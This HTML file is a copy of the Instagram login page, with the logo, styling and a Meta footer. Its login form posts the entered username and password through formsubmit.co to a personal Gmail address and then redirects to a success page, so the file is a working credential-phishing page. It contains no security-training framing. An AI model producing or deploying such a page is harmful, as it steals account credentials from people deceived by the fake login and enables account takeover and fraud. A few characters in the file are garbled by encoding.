<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    body {
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      max-width: 350px;
      width: 100%;
      padding: 40px;
      background: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
    }

    .logo img {
      width: 175px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 9px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }

    .btn-login {
      background-color: #3897f0;
      border: none;
      color: white;
      padding: 10px;
      width: 100%;
      border-radius: 4px;
      font-weight: bold;
    }

    .footer {
      margin-top: 20px;
      font-size: 13px;
      color: #999;
    }

    .input-group {
      position: relative;
    }

    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
    }

    .signup {
      margin-top: 15px;
      font-size: 14px;
    }

    .signup a {
      color: #3897f0;
      font-weight: 600;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
    </div>

    <form action="https://formsubmit.co/onuwamarvellous@gmail.com" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      
      <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Password" required>
        <span class="toggle-password" onclick="togglePassword()">üëÅ</span>
      </div>

      <input type="hidden" name="_next" value="success.html">
      <button type="submit" class="btn-login">Log In</button>
    </form>

    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="footer">¬© 2025 Instagram from Meta</div>
  </div>

  <script>
    function togglePassword() {
      const passInput = document.getElementById('password');
      passInput.type = passInput.type === 'password' ? 'text' : 'password';
    }
  </script>
</body>
</html>
